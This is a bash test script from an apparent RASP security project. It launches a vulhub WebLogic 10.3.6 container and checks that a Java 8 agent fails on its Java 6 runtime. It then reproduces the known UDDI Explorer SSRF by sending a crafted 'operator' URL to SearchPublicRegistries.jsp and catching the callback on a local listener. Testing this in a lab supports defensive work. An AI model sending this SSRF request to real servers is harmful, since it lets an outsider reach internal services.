#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
image="${OHMYRASP_VULHUB_WEBLOGIC_UDDI_IMAGE:-vulhub/weblogic:10.3.6.0-2017}"
baseline_name="${OHMYRASP_VULHUB_WEBLOGIC_UDDI_BASELINE_NAME:-ohmyrasp-weblogic-uddi-baseline}"
baseline_port="${OHMYRASP_VULHUB_WEBLOGIC_UDDI_BASELINE_PORT:-19680}"
listener_port="${OHMYRASP_VULHUB_WEBLOGIC_UDDI_LISTENER_PORT:-21680}"
baseline_dir="logs/vulhub-weblogic-uddi-ssrf-java6-baseline"
protected_dir="logs/vulhub-weblogic-uddi-ssrf-java6-protected"
listener_pid=""

copy_artifacts() {
  mkdir -p "$baseline_dir"
  if docker inspect "$baseline_name" >/dev/null 2>&1; then
    docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
    docker exec "$baseline_name" bash -lc \
      'tail -n 220 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log 2>/dev/null || true' \
      > "${baseline_dir}/adminserver.log" 2>&1 || true
  fi
}

cleanup() {
  if [[ -n "$listener_pid" ]]; then
    kill "$listener_pid" >/dev/null 2>&1 || true
    wait "$listener_pid" >/dev/null 2>&1 || true
    listener_pid=""
  fi
  copy_artifacts
  docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

build_java8_agent() {
  mkdir -p /tmp/ohmyrasp-gradle-cache
  docker run --rm -u "$(id -u):$(id -g)" \
    -e GRADLE_USER_HOME=/tmp/gradle-cache \
    -v /tmp/ohmyrasp-gradle-cache:/tmp/gradle-cache \
    -v "$(pwd):/workspace" \
    -w /workspace \
    gradle:jdk25 \
    gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null
}

verify_java6_boundary() {
  docker run --rm --entrypoint bash "$image" -lc \
    '"$JAVA16_HOME/bin/java" -version' > "${protected_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'java version "1.6.0_45"' "${protected_dir}/image-java-version.txt"; then
    cat "${protected_dir}/image-java-version.txt" >&2 || true
    echo "WebLogic UDDI SSRF image did not report the expected Java 6 runtime" >&2
    exit 1
  fi

  set +e
  docker run --rm --entrypoint bash \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    "$image" -lc '"$JAVA16_HOME/bin/java" -javaagent:/tmp/ohmyrasp-agent-java8.jar -version' \
    > "${protected_dir}/java8-agent-on-java6.log" 2>&1
  local status="$?"
  set -e
  printf 'java8_agent_on_java6_status=%s\n' "$status" > "${protected_dir}/attempts.log"
  if ! grep -Fq 'Unsupported major.minor version 52.0' "${protected_dir}/java8-agent-on-java6.log"; then
    cat "${protected_dir}/java8-agent-on-java6.log" >&2 || true
    echo "Java 6 WebLogic did not reject the Java 8 agent with the expected class-version error" >&2
    exit 1
  fi
}

start_listener() {
  local marker="$1"
  local request_output="$2"
  local listener_output="$3"
  rm -f "$marker" "$request_output"
  python3 -u - "$listener_port" "$marker" "$request_output" > "$listener_output" 2>&1 <<'PY' &
import pathlib
import socket
import sys

port = int(sys.argv[1])
marker = pathlib.Path(sys.argv[2])
request_output = pathlib.Path(sys.argv[3])

sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.listen(1)
sock.settimeout(180)
print("LISTEN", port, flush=True)
try:
    conn, addr = sock.accept()
    print("CONNECT", addr, flush=True)
    marker.write_text(str(addr), encoding="utf-8")
    data = conn.recv(4096)
    request_output.write_bytes(data)
    conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
    conn.close()
finally:
    sock.close()
PY
  listener_pid="$!"
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host host.docker.internal:host-gateway \
    -p "${baseline_port}:7001" \
    "$image" >/dev/null
}

wait_for_uddi() {
  local status
  for attempt in $(seq 1 240); do
    status="$(curl_status "${baseline_dir}/ready-${attempt}.html" \
      "http://127.0.0.1:${baseline_port}/uddiexplorer/")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${baseline_dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      cp "${baseline_dir}/ready-${attempt}.html" "${baseline_dir}/uddi-ready.html"
      return
    fi
    if ! docker ps --filter "name=${baseline_name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$baseline_name"; then
      docker logs "$baseline_name" >&2 || true
      echo "WebLogic UDDI baseline container stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done

  docker logs "$baseline_name" >&2 || true
  echo "WebLogic UDDI did not become ready on ${baseline_port}" >&2
  exit 1
}

send_uddi_ssrf_request() {
  local output="$1"
  curl_status "$output" \
    -G \
    --data-urlencode "rdoSearch=name" \
    --data-urlencode "txtSearchname=sdf" \
    --data-urlencode "txtSearchkey=" \
    --data-urlencode "txtSearchfor=" \
    --data-urlencode "selfor=Business location" \
    --data-urlencode "btnSubmit=Search" \
    --data-urlencode "operator=http://host.docker.internal:${listener_port}/ohmyrasp-uddi-probe" \
    "http://127.0.0.1:${baseline_port}/uddiexplorer/SearchPublicRegistries.jsp"
}

wait_for_ssrf_callback() {
  local marker="${baseline_dir}/listener.marker"
  local request_output="${baseline_dir}/listener.request"
  local listener_output="${baseline_dir}/listener.log"
  local status marker_present
  start_listener "$marker" "$request_output" "$listener_output"
  sleep 1

  for attempt in $(seq 1 60); do
    status="$(send_uddi_ssrf_request "${baseline_dir}/ssrf-${attempt}.response")"
    marker_present="no"
    if [[ -s "$marker" ]]; then
      marker_present="yes"
    fi
    printf 'ssrf_attempt=%s status=%s marker=%s\n' "$attempt" "$status" "$marker_present" \
      >> "${baseline_dir}/attempts.log"
    if [[ "$marker_present" == "yes" ]]; then
      wait "$listener_pid" >/dev/null 2>&1 || true
      listener_pid=""
      return
    fi
    sleep 2
  done

  if [[ -n "$listener_pid" ]]; then
    kill "$listener_pid" >/dev/null 2>&1 || true
    wait "$listener_pid" >/dev/null 2>&1 || true
    listener_pid=""
  fi
  cat "$listener_output" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline WebLogic UDDI SSRF did not reach the host listener" >&2
  exit 1
}

build_java8_agent

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

verify_java6_boundary
start_baseline
wait_for_uddi
wait_for_ssrf_callback
copy_artifacts
docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

echo "vulhub WebLogic UDDI SSRF Java6 legacy boundary passed"
